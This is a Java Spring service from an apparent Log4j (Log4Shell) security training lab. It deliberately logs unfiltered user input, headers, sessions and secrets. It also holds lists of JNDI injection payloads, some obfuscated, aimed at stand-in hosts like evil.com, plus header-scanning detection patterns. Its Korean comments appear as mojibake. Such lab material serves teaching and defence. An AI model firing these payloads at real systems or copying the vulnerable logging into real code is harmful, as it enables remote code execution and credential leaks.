package com.example.demo.api.vulnerability.service;

import com.example.demo.entity.jpa.user.UserActivity;
import com.example.demo.repo.jpa.user.UserActivityRepository;
import lombok.RequiredArgsConstructor;
import lombok.extern.log4j.Log4j2;
import org.springframework.stereotype.Service;

import javax.servlet.http.HttpServletRequest;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Map;

/**
 * Log4j ì·¨ì•½ì  ì‹¤ìŠµ ì „ìš© ì„œë¹„ìŠ¤
 * âš ï¸ êµìœ¡ ëª©ì ìœ¼ë¡œë§Œ ì‚¬ìš©! ì‹¤ì œ ìš´ì˜ í™˜ê²½ì—ì„œëŠ” ì‚¬ìš© ê¸ˆì§€
 */
@Service
@RequiredArgsConstructor
@Log4j2
public class VulnerabilityService {

    private final UserActivityRepository userActivityRepository;

    /**
     * ğŸš¨ ì·¨ì•½í•œ ë¡œê¹… - ì‚¬ìš©ì ì…ë ¥ì„ í•„í„°ë§ ì—†ì´ ì§ì ‘ ë¡œê¹…
     */
    public void logUserInput(String userInput, HttpServletRequest request) {
        // JNDI Injection ì·¨ì•½ì  - ì‚¬ìš©ì ì…ë ¥ì„ ê·¸ëŒ€ë¡œ ë¡œê¹…
        log.info("User input received: {}", userInput);
        log.info("User input details - Value: {}, Length: {}, From IP: {}", 
                userInput, userInput.length(), getClientIpAddress(request));
        
        // í™œë™ ê¸°ë¡
        UserActivity activity = UserActivity.builder()
                .username(getCurrentUsername(request))
                .activity("VULNERABLE_INPUT")
                .ipAddress(getClientIpAddress(request))
                .userAgent(request.getHeader("User-Agent"))
                .details("Input: " + userInput)
                .success(true)
                .build();
        userActivityRepository.save(activity);
    }

    /**
     * ğŸš¨ ì·¨ì•½í•œ í—¤ë” ë¡œê¹… - HTTP í—¤ë”ë¥¼ í•„í„°ë§ ì—†ì´ ë¡œê¹…
     */
    public void logHttpHeaders(HttpServletRequest request) {
        Enumeration<String> headerNames = request.getHeaderNames();
        Map<String, String> headers = new HashMap<>();
        
        while (headerNames.hasMoreElements()) {
            String headerName = headerNames.nextElement();
            String headerValue = request.getHeader(headerName);
            headers.put(headerName, headerValue);
            
            // ğŸš¨ ê° í—¤ë”ë¥¼ ê°œë³„ì ìœ¼ë¡œ ë¡œê¹… (JNDI Injection ê°€ëŠ¥)
            log.info("HTTP Header - {}: {}", headerName, headerValue);
        }
        
        // ğŸš¨ User-Agent íŠ¹ë³„ ë¡œê¹…
        String userAgent = request.getHeader("User-Agent");
        if (userAgent != null) {
            log.info("Processing request from User-Agent: {}", userAgent);
            log.debug("User-Agent details: {}", userAgent);
        }
        
        // ğŸš¨ X-Forwarded-For ë¡œê¹…
        String xForwardedFor = request.getHeader("X-Forwarded-For");
        if (xForwardedFor != null) {
            log.info("X-Forwarded-For header: {}", xForwardedFor);
        }
        
        // ğŸš¨ Referer ë¡œê¹…
        String referer = request.getHeader("Referer");
        if (referer != null) {
            log.info("Request referer: {}", referer);
        }
    }

    /**
     * ğŸš¨ ì·¨ì•½í•œ ì—ëŸ¬ ë¡œê¹… - ì—ëŸ¬ ë©”ì‹œì§€ì— ì‚¬ìš©ì ì…ë ¥ í¬í•¨
     */
    public void logError(String errorMessage, String userInput, HttpServletRequest request) {
        // ì—ëŸ¬ ë©”ì‹œì§€ì— ì‚¬ìš©ì ì…ë ¥ì´ í¬í•¨ë˜ì–´ JNDI Injection ë°œìƒ ê°€ëŠ¥
        log.error("Error occurred while processing user input '{}': {}", userInput, errorMessage);
        log.error("Error details - Input: {}, IP: {}, User-Agent: {}", 
                userInput, getClientIpAddress(request), request.getHeader("User-Agent"));
        
        // ìŠ¤íƒ íŠ¸ë ˆì´ìŠ¤ì—ë„ ì‚¬ìš©ì ì…ë ¥ í¬í•¨
        try {
            throw new RuntimeException("Processing failed for input: " + userInput);
        } catch (RuntimeException e) {
            log.error("Exception with user input: {}", userInput, e);
        }
    }

    /**
     * ğŸš¨ ì·¨ì•½í•œ ê²€ìƒ‰ ë¡œê¹… - ê²€ìƒ‰ì–´ íŒ¨í„´ ë¶„ì„ ì‹œ ë¡œê¹…
     */
    public void analyzeSearchPattern(String searchTerm, HttpServletRequest request) {
        // ê²€ìƒ‰ì–´ íŒ¨í„´ ë¶„ì„
        log.info("Analyzing search pattern: {}", searchTerm);
        
        // íŠ¹ìˆ˜ ë¬¸ì ê²€ì‚¬ (ì·¨ì•½í•œ ë¡œê¹…)
        if (searchTerm.contains("$")) {
            log.warn("Search term contains special character '$': {}", searchTerm);
        }
        
        if (searchTerm.contains("{")) {
            log.warn("Search term contains special character '{{': {}", searchTerm);
        }
        
        if (searchTerm.contains("jndi")) {
            log.warn("Search term contains 'jndi': {}", searchTerm);
        }
        
        if (searchTerm.contains("ldap")) {
            log.warn("Search term contains 'ldap': {}", searchTerm);
        }
        
        // ê²€ìƒ‰ì–´ ê¸¸ì´ë³„ ë¶„ë¥˜ ë¡œê¹…
        if (searchTerm.length() > 50) {
            log.info("Long search term detected: {}", searchTerm);
        }
        
        // ê²€ìƒ‰ì–´ë¥¼ ëŒ€ì†Œë¬¸ì ë³€í™˜í•˜ì—¬ ë¡œê¹…
        log.debug("Search term variations - Lower: {}, Upper: {}", 
                searchTerm.toLowerCase(), searchTerm.toUpperCase());
    }

    /**
     * ğŸš¨ ì·¨ì•½í•œ íŒŒì¼ ì—…ë¡œë“œ ë¡œê¹…
     */
    public void logFileUpload(String fileName, String fileContent, HttpServletRequest request) {
        log.info("File upload - Name: {}, Size: {}, From: {}", 
                fileName, fileContent.length(), getClientIpAddress(request));
        
        // íŒŒì¼ ë‚´ìš© ë¯¸ë¦¬ë³´ê¸° ë¡œê¹… (JNDI Injection ê°€ëŠ¥)
        String preview = fileContent.length() > 100 ? 
                fileContent.substring(0, 100) : fileContent;
        log.info("File content preview: {}", preview);
        
        // íŒŒì¼ëª… ë¶„ì„ ë¡œê¹…
        log.debug("File name analysis: {}", fileName);
    }

    /**
     * ğŸ” JNDI ê³µê²© íŒ¨í„´ ì‹œë®¬ë ˆì´ì…˜ (êµìœ¡ìš©)
     */
    public void simulateJndiAttack() {
        // ì¼ë°˜ì ì¸ JNDI ê³µê²© íŒ¨í„´ë“¤ì„ ë¡œê¹…í•˜ì—¬ ì·¨ì•½ì  ì‹œì—°
        String[] attackPatterns = {
                "${jndi:ldap://evil.com/exploit}",
                "${jndi:rmi://malicious.server/payload}",
                "${jndi:dns://attacker.com/exfiltrate}",
                "${${lower:jndi}:${lower:ldap}://evil.com/exploit}",
                "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/exploit}"
        };
        
        log.warn("=== JNDI Attack Pattern Simulation (FOR EDUCATIONAL PURPOSES) ===");
        for (String pattern : attackPatterns) {
            // ğŸš¨ ì‹¤ì œë¡œ JNDI Injectionì´ ë°œìƒí•˜ëŠ” ë¡œê¹…
            log.info("Simulating attack pattern: {}", pattern);
        }
        log.warn("=== End of Simulation ===");
    }

    /**
     * ğŸ” ë³´ì•ˆ ëª¨ë‹ˆí„°ë§ - ì‹¤ì‹œê°„ ê³µê²© íƒì§€
     */
    public void detectRealTimeAttacks(HttpServletRequest request) {
        String userAgent = request.getHeader("User-Agent");
        String referer = request.getHeader("Referer");
        
        // User-Agent íŒ¨í„´ ê²€ì‚¬
        if (userAgent != null && (userAgent.contains("${jndi:") || userAgent.contains("ldap://"))) {
            log.error("ğŸš¨ SECURITY ALERT: Potential JNDI attack in User-Agent: {}", userAgent);
        }
        
        // Referer íŒ¨í„´ ê²€ì‚¬
        if (referer != null && (referer.contains("${jndi:") || referer.contains("ldap://"))) {
            log.error("ğŸš¨ SECURITY ALERT: Potential JNDI attack in Referer: {}", referer);
        }
        
        // ëª¨ë“  í—¤ë” ê²€ì‚¬
        Enumeration<String> headerNames = request.getHeaderNames();
        while (headerNames.hasMoreElements()) {
            String headerName = headerNames.nextElement();
            String headerValue = request.getHeader(headerName);
            
            if (headerValue != null && headerValue.contains("${jndi:")) {
                log.error("ğŸš¨ SECURITY ALERT: Potential JNDI attack in header {}: {}", 
                        headerName, headerValue);
            }
        }
    }

    /**
     * ğŸš¨ ì·¨ì•½í•œ ì‚¬ìš©ì ì •ë³´ ë¡œê¹…
     */
    public void logUserInfo(String username, String email, String additionalInfo, HttpServletRequest request) {
        // ì‚¬ìš©ì ì •ë³´ë¥¼ ê·¸ëŒ€ë¡œ ë¡œê¹…
        log.info("User information - Username: {}, Email: {}, Additional: {}", 
                username, email, additionalInfo);
        
        // ìƒì„¸ ì •ë³´ ë¡œê¹…
        log.debug("User details from IP {}: Username='{}', Email='{}', Info='{}'", 
                getClientIpAddress(request), username, email, additionalInfo);
    }

    /**
     * ğŸš¨ ì·¨ì•½í•œ ì„¤ì • ê°’ ë¡œê¹…
     */
    public void logConfigurationValue(String configKey, String configValue, HttpServletRequest request) {
        // ì„¤ì • ê°’ì„ í•„í„°ë§ ì—†ì´ ë¡œê¹…
        log.info("Configuration access - Key: {}, Value: {}", configKey, configValue);
        log.debug("Config requested from IP {}: {}={}", 
                getClientIpAddress(request), configKey, configValue);
        
        // íŠ¹ì • ì„¤ì • í‚¤ì— ëŒ€í•œ íŠ¹ë³„ ì²˜ë¦¬
        if (configKey.toLowerCase().contains("password") || configKey.toLowerCase().contains("secret")) {
            log.warn("Sensitive configuration accessed: {} = {}", configKey, configValue);
        }
    }

    /**
     * ğŸš¨ ì·¨ì•½í•œ ì¿¼ë¦¬ ë¡œê¹…
     */
    public void logDatabaseQuery(String query, String parameters, HttpServletRequest request) {
        // ë°ì´í„°ë² ì´ìŠ¤ ì¿¼ë¦¬ì™€ íŒŒë¼ë¯¸í„°ë¥¼ ê·¸ëŒ€ë¡œ ë¡œê¹…
        log.info("Database query executed: {}", query);
        log.debug("Query parameters: {}", parameters);
        log.debug("Query from IP {}: {} with params: {}", 
                getClientIpAddress(request), query, parameters);
    }

    /**
     * ğŸš¨ ì·¨ì•½í•œ API ì‘ë‹µ ë¡œê¹…
     */
    public void logApiResponse(String endpoint, String responseData, HttpServletRequest request) {
        // API ì‘ë‹µ ë°ì´í„°ë¥¼ ê·¸ëŒ€ë¡œ ë¡œê¹…
        log.info("API response for endpoint {}: {}", endpoint, responseData);
        log.debug("Response to IP {}: {}", getClientIpAddress(request), responseData);
        
        // ì‘ë‹µ í¬ê¸° ë¡œê¹…
        log.debug("Response size for {}: {} characters", endpoint, responseData.length());
    }

    /**
     * ğŸš¨ ì·¨ì•½í•œ ì„¸ì…˜ ì •ë³´ ë¡œê¹…
     */
    public void logSessionInfo(String sessionId, String sessionData, HttpServletRequest request) {
        // ì„¸ì…˜ ì •ë³´ë¥¼ ê·¸ëŒ€ë¡œ ë¡œê¹…
        log.info("Session information - ID: {}, Data: {}", sessionId, sessionData);
        log.debug("Session from IP {}: ID={}, Data={}", 
                getClientIpAddress(request), sessionId, sessionData);
    }

    /**
     * ğŸš¨ ë©€í‹° íŒŒë¼ë¯¸í„° ë¡œê¹… (ì—¬ëŸ¬ ì‚¬ìš©ì ì…ë ¥ì„ ë™ì‹œì— ë¡œê¹…)
     */
    public void logMultipleInputs(Map<String, String> inputMap, HttpServletRequest request) {
        // ëª¨ë“  ì…ë ¥ê°’ì„ ê°œë³„ì ìœ¼ë¡œ ë¡œê¹…
        inputMap.forEach((key, value) -> {
            log.info("Input parameter - {}: {}", key, value);
        });
        
        // ì „ì²´ ì…ë ¥ ë§µì„ í•œë²ˆì— ë¡œê¹…
        log.debug("All inputs from IP {}: {}", getClientIpAddress(request), inputMap);
        
        // ì…ë ¥ê°’ë“¤ì˜ ì¡°í•© ë¡œê¹…
        String combinedInputs = String.join("|", inputMap.values());
        log.debug("Combined input values: {}", combinedInputs);
    }

    /**
     * ğŸ” ê³µê²© íŒ¨í„´ ë¬¸ìì—´ ìƒì„± (êµìœ¡ìš©)
     */
    public String[] getCommonAttackPatterns() {
        return new String[]{
                "${jndi:ldap://attacker.com/exploit}",
                "${jndi:rmi://evil.server/payload}",
                "${jndi:dns://malicious.domain/data}",
                "${${lower:jndi}:${lower:ldap}://bypass.com/exploit}",
                "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://obfuscated.com/exploit}",
                "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a}",
                "${${lower:${lower:jndi}}:${lower:ldap}://evil.com/exploit}"
        };
    }

    // ìœ í‹¸ë¦¬í‹° ë©”ì„œë“œ
    private String getClientIpAddress(HttpServletRequest request) {
        String xForwardedFor = request.getHeader("X-Forwarded-For");
        if (xForwardedFor != null && !xForwardedFor.isEmpty()) {
            return xForwardedFor.split(",")[0].trim();
        }
        
        String xRealIp = request.getHeader("X-Real-IP");
        if (xRealIp != null && !xRealIp.isEmpty()) {
            return xRealIp;
        }
        
        return request.getRemoteAddr();
    }

    private String getCurrentUsername(HttpServletRequest request) {
        // ì‹¤ì œ êµ¬í˜„ì—ì„œëŠ” Security Contextì—ì„œ ê°€ì ¸ì˜´
        return request.getRemoteUser() != null ? request.getRemoteUser() : "anonymous";
    }
}
